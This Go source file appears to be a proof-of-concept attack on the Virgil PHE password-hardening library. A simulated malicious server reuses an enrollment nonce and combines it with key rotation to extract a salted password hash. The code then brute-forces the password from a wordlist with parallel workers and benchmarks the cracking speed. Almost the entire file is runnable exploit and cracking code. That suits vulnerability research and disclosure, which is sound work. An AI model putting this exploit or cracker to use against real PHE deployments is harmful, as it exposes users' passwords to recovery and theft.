package main

import (
	"bufio"
	"fmt"
	"log"
	"math/big"
	"os"
	"pheattack/utils"
	"sync"
	"time"

	phe "github.com/VirgilSecurity/virgil-phe-go"
	"github.com/golang/protobuf/proto"
)

func main() {
	passwordFile := "passwords.txt"
	malPW := []byte("mal_pw")

	// Setup of our attack,
	// we first create an enrollment record honestly,
	// then, we have a malicious server that reuses a nonce
	// We perform a key rotation and publish the clientKey after this rotation
	// alongside the updated honest and malicious records
	clientKeyBytes, honestRecordBytes, maliciousRecordBytes := malicious_server(malPW, passwordFile)

	// Second half of our attack, after key rotation
	// we have a malicious client after key rotation and rotated honest and malicious records
	// the attacker returns a salted hash and the salt, ready for bruteforcing
	saltedHash, extractedNonce := malicious_client(clientKeyBytes, honestRecordBytes, maliciousRecordBytes, malPW)

	// 🔍 last step of our attack, we bruteforce the password using a password file
	fmt.Println("🔍 Starting brute force attack...")

	workerCounts := []int{128, 64, 32, 24, 16, 8, 4, 2, 1}
	for _, workerCount := range workerCounts {
		start := time.Now()
		_ = bruteForceParallel(saltedHash, extractedNonce, passwordFile, workerCount)
		fmt.Printf("⚡ brute-force time (%d workers): %v\n", workerCount, time.Since(start))
	}

}

func malicious_client(clientKeyBytes []byte, honestRecordBytes []byte, maliciousRecordBytes []byte, malPW []byte) (*phe.Point, []byte) {
	maliciousRecord := &phe.EnrollmentRecord{}
	// Unmarshal the Bytes into the structs
	if err := proto.Unmarshal(maliciousRecordBytes, maliciousRecord); err != nil {
		log.Fatal("Error: ", err.Error())
	}
	honestRecord := &phe.EnrollmentRecord{}
	// Unmarshal the Bytes into the structs
	if err := proto.Unmarshal(honestRecordBytes, honestRecord); err != nil {
		log.Fatal("Error: ", err.Error())
	}
	clientKey := new(big.Int).SetBytes(clientKeyBytes)

	// first part of our attack, we extract the PRF value of the ratelimiter after key rotation
	hs_extracted, err := extract_enrollment_prf(maliciousRecordBytes, clientKeyBytes, malPW)
	if err != nil {
		log.Fatal("Error: ", err.Error())
	}

	// second part of our attack, we use the extracted server PRF value to obtain the client prf of the salted password
	hc2, extractedNonce, err := extract_salted_hash(honestRecordBytes, hs_extracted, clientKey)
	if err != nil {
		log.Fatal("Error extracting salted Hash: ", err.Error())
	}

	return hc2, extractedNonce
}

func extract_enrollment_prf(maliciousRecordBytes []byte, clientKeyBytes []byte, malPW []byte) (*phe.Point, error) {
	fmt.Println("🚨 Extracting shared Server Challenge PRF Value...")

	rec := &phe.EnrollmentRecord{}
	// Unmarshal the Bytes into the structs
	if err := proto.Unmarshal(maliciousRecordBytes, rec); err != nil {
		return &phe.Point{}, err
	}
	t0, err := phe.PointUnmarshal(rec.T0)
	if err != nil {
		log.Fatalf("Error unmarshalling t_0: %v", err.Error())
		return &phe.Point{}, err
	}

	hc0 := utils.HashToPoint(utils.Dhc0, rec.Nc, malPW)
	clientKey := new(big.Int).SetBytes(clientKeyBytes)
	invClientKey := utils.Gf.Neg(clientKey)

	extT0 := t0.Add(hc0.ScalarMultInt(invClientKey))

	return extT0, nil
}

func extract_challenge_client_prf(honestRecordBytes []byte, challengePRFPoint *phe.Point) (*phe.Point, []byte, error) {
	fmt.Println("🚨 Extracting salted hash")

	rec := &phe.EnrollmentRecord{}
	// Unmarshal the Bytes into the structs
	if err := proto.Unmarshal(honestRecordBytes, rec); err != nil {
		return &phe.Point{}, []byte{}, err
	}

	t_0_star, err := phe.PointUnmarshal(rec.T0)
	if err != nil {
		log.Fatalf("Error unmarshalling t_0: %v", err.Error())
		return &phe.Point{}, []byte{}, err
	}

	client_prf_star := t_0_star.Add(challengePRFPoint.Neg())

	return client_prf_star, rec.Nc, nil
}

func extract_salted_hash(honestRecordBytes []byte, challengePRFPoint *phe.Point, clientKey *big.Int) (*phe.Point, []byte, error) {
	extracted_client_prf, extractedNonce, err := extract_challenge_client_prf(honestRecordBytes, challengePRFPoint)
	if err != nil {
		return &phe.Point{}, []byte{}, err
	}
	// third part of the attack: moving from client PRF to a salted password hash with salt nc
	// Compute inverse of clientKey modulo curve order
	clientKeyInv := new(big.Int).ModInverse(clientKey, utils.Curve.Params().N)
	hc2 := extracted_client_prf.ScalarMultInt(clientKeyInv)
	return hc2, extractedNonce, nil
}

// returns client private key,
// honest record and malicious record
func malicious_server(malPW []byte, passwordFile string) ([]byte, []byte, []byte) {
	// Generate server keypair
	serverKeypair, err := phe.GenerateServerKeypair()
	if err != nil {
		log.Fatalf("Error generating server keypair: %v", err)
	}

	// Get public key
	pub, err := phe.GetPublicKey(serverKeypair)
	if err != nil {
		log.Fatalf("Error getting public key: %v", err)
	}

	client_key := utils.RandomZ().Bytes()

	// Create client instance
	client, err := phe.NewClient(pub, client_key)
	if err != nil {
		log.Fatalf("Error creating client: %v", err)
	}

	// Enroll the honest user
	// Select a random password from the password file
	securePW, err := getRandomPassword(string(passwordFile))
	if err != nil {
		log.Fatalf("Error selecting password: %v", err)
	}
	// Get enrollment data from server
	enrollment_0, err := phe.GetEnrollment(serverKeypair)
	if err != nil {
		log.Fatalf("Error getting enrollment: %v", err)
	}

	// Enroll an account, this is the secure login
	record, _, err := client.EnrollAccount(securePW, enrollment_0)
	if err != nil {
		log.Fatalf("Error enrolling account: %v", err)
	}

	// Create password verification request
	req, err := client.CreateVerifyPasswordRequest(securePW, record)
	if err != nil {
		log.Fatalf("Error creating verify password request: %v", err)
	}

	// Verify password on the server
	_, result1, err := phe.VerifyPasswordExtended(serverKeypair, req)
	if err != nil {
		log.Fatalf("Error verifying password: %v", err)
	}
	if !result1.Res {
		log.Fatalf("Password verification failed")
	}
	fmt.Println("✅ Honest login: Password verification and decryption successful!")

	// Enroll the malicious user
	// get enrollment data from server, server acts malicious:
	// Server is malicious, he will send the same element for the second enrollment
	enrollment_1 := enrollment_0

	// malicious ratelimiter enrolls to bruteforce
	pwd_1 := malPW
	record_1, _, err := client.EnrollAccount(pwd_1, enrollment_1)
	if err != nil {
		log.Fatalf("Error enrolling account: %v", err)
	}

	// test malicious password
	// Create password verification request
	req_1, err := client.CreateVerifyPasswordRequest(pwd_1, record_1)
	if err != nil {
		log.Fatalf("Error creating verify password request: %v", err)
	}

	// Verify password on the server
	_, result1_1, err := phe.VerifyPasswordExtended(serverKeypair, req_1)
	if err != nil {
		log.Fatalf("Error verifying password: %v", err)
	}
	if !result1_1.Res {
		log.Fatalf("Password verification failed")
	}

	fmt.Println("✅ Malicious login: Password verification and decryption successful!")

	// rotating keys:
	fmt.Println("✅ Rotating Keys")
	// Perform server key rotation
	token, serverKeypair, err := phe.Rotate(serverKeypair)
	if err != nil {
		log.Fatalf("Error rotating server key: %v", err)
	}

	// rotate client
	client_key, _, err = phe.RotateClientKeys(pub, client_key, token)
	//err = client.Rotate(token)
	if err != nil {
		log.Fatalf("Error rotating client keys: %v", err)
	}

	// Update honest record
	record, err = phe.UpdateRecord(record, token)
	if err != nil {
		log.Fatalf("Error updating record: %v", err)
	}

	// Update honest record
	record_1, err = phe.UpdateRecord(record_1, token)
	if err != nil {
		log.Fatalf("Error updating record: %v", err)
	}

	return client_key, record, record_1
}

func normal_run() {
	// Generate server keypair
	serverKeypair, err := phe.GenerateServerKeypair()
	if err != nil {
		log.Fatalf("Error generating server keypair: %v", err)
	}

	// Get public key
	pub, err := phe.GetPublicKey(serverKeypair)
	if err != nil {
		log.Fatalf("Error getting public key: %v", err)
	}

	// Create client instance
	client, err := phe.NewClient(pub, utils.RandomZ().Bytes())
	if err != nil {
		log.Fatalf("Error creating client: %v", err)
	}

	// Get enrollment data from server
	enrollment, err := phe.GetEnrollment(serverKeypair)
	if err != nil {
		log.Fatalf("Error getting enrollment: %v", err)
	}

	// Enroll an account
	pwd := []byte("SecurePassword123")
	record, key, err := client.EnrollAccount(pwd, enrollment)
	if err != nil {
		log.Fatalf("Error enrolling account: %v", err)
	}

	// Create password verification request
	req, err := client.CreateVerifyPasswordRequest(pwd, record)
	if err != nil {
		log.Fatalf("Error creating verify password request: %v", err)
	}

	// Verify password on the server
	resp, result1, err := phe.VerifyPasswordExtended(serverKeypair, req)
	if err != nil {
		log.Fatalf("Error verifying password: %v", err)
	}
	if !result1.Res {
		log.Fatalf("Password verification failed")
	}

	// Validate response and decrypt stored key
	decryptedKey, err := client.CheckResponseAndDecrypt(pwd, record, resp)
	if err != nil {
		log.Fatalf("Error decrypting stored key: %v", err)
	}
	if string(decryptedKey) != string(key) {
		log.Fatalf("Decrypted key does not match the original key")
	}

	fmt.Println("✅ Password verification and decryption successful!")

	// Perform server key rotation
	token, newPrivate, err := phe.Rotate(serverKeypair)
	if err != nil {
		log.Fatalf("Error rotating server key: %v", err)
	}

	// Apply rotation on client side
	err = client.Rotate(token)
	if err != nil {
		log.Fatalf("Error rotating client keys: %v", err)
	}

	// Ensure rotated public key matches server's new key
	_, err = phe.GetPublicKey(newPrivate)
	if err != nil {
		log.Fatalf("Error getting new public key: %v", err)
	}
	//if string(newPub) != string(client.ServerPublicKeyBytes) {
	//		log.Fatalf("Public key mismatch after rotation")
	//}

	// Update stored record
	updatedRecord, err := phe.UpdateRecord(record, token)
	if err != nil {
		log.Fatalf("Error updating record: %v", err)
	}

	// Create password verification request for updated record
	req, err = client.CreateVerifyPasswordRequest(pwd, updatedRecord)
	if err != nil {
		log.Fatalf("Error creating verify password request for updated record: %v", err)
	}

	// Verify password on the server using the new key
	resp, result2, err := phe.VerifyPasswordExtended(newPrivate, req)
	if err != nil {
		log.Fatalf("Error verifying password after rotation: %v", err)
	}
	if !result2.Res {
		log.Fatalf("Password verification failed after rotation")
	}

	// Validate response and decrypt stored key again
	decryptedKey, err = client.CheckResponseAndDecrypt(pwd, updatedRecord, resp)
	if err != nil {
		log.Fatalf("Error decrypting stored key after rotation: %v", err)
	}
	if string(decryptedKey) != string(key) {
		log.Fatalf("Decrypted key after rotation does not match the original key")
	}

	fmt.Println("✅ Password verification and decryption after rotation successful!")
}

// getRandomPassword selects a random password from a password file.
func getRandomPassword(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("could not open password file: %w", err)
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading password file: %w", err)
	}

	// Check if the password list is empty
	if len(passwords) == 0 {
		return nil, fmt.Errorf("password file is empty")
	}

	// Choose a random password from the list
	randomIndex := -1
	for randomIndex < 0 || randomIndex >= len(passwords) {
		randomIndex = int(utils.RandomZ().Int64() % int64(len(passwords)))
	}
	//fmt.Println("DEBUG: Random index generated:", randomIndex)
	fmt.Println("🐛 Randomly selected password:", passwords[randomIndex])

	return []byte(passwords[randomIndex]), nil
}

// bruteForce tries to find the password by hashing each candidate from a file
func bruteForce(hc2 *phe.Point, extractedNonce []byte, filename string) []byte {
	fmt.Println("🔍 Starting single-threaded brute force attack...")

	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("❌ Error opening password file: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	attempts := 0
	start := time.Now()

	for scanner.Scan() {
		attempts++
		candidate := scanner.Text()
		hc0 := utils.HashToPoint(utils.Dhc0, extractedNonce, []byte(candidate))
		if hc0.Equal(hc2) {
			fmt.Printf("✅ Password found after %d attempts! 🎉\n", attempts)
			fmt.Printf("🔑 Recovered password: %s\n", candidate)
			fmt.Printf("⏳ Time taken: %v\n", time.Since(start))
			return []byte(candidate)
		}
	}

	fmt.Printf("❌ Brute force failed. Password not found in file.\n")
	fmt.Printf("⏳ Time taken: %v | Attempts: %d\n", time.Since(start), attempts)
	return nil // No password match found
}

// bruteForceParallel attempts password cracking using goroutines
func bruteForceParallel(hc2 *phe.Point, extractedNonce []byte, filename string, numWorkers int) []byte {
	// Read passwords into memory (avoid concurrent file access)
	passwords, err := readPasswords(filename)
	if err != nil {
		log.Fatalf("Error reading password file: %v", err)
	}

	jobs := make(chan string, len(passwords))
	results := make(chan []byte, numWorkers)
	var wg sync.WaitGroup

	// Worker function
	worker := func() {
		defer wg.Done()
		for candidate := range jobs {
			hc0 := utils.HashToPoint(utils.Dhc0, extractedNonce, []byte(candidate))
			if hc0.Equal(hc2) {
				fmt.Println("✅ Found password:", candidate)
				results <- []byte(candidate) // Send result
				return
			}
		}
	}

	// Start workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker()
	}

	// Distribute jobs
	for _, pw := range passwords {
		jobs <- pw
	}
	close(jobs)

	// Wait for workers
	go func() {
		wg.Wait()
		close(results)
	}()

	// Return first found password
	for result := range results {
		return result
	}

	fmt.Println("❌ Brute force failed.")
	return nil
}

// Reads passwords into memory
func readPasswords(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("could not open password file: %w", err)
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading password file: %w", err)
	}
	return passwords, nil
}

// bruteForceWorker processes password candidates and checks for matches
func bruteForceWorker(hc2 *phe.Point, extractedNonce []byte, passwords <-chan string, results chan<- []byte, wg *sync.WaitGroup) {
	defer wg.Done()

	for candidate := range passwords {
		hc0 := utils.HashToPoint(utils.Dhc0, extractedNonce, []byte(candidate))
		if hc0.Equal(hc2) {
			// If we find a match, send it and exit immediately
			select {
			case results <- []byte(candidate):
			default:
			}
			return
		}
	}
}
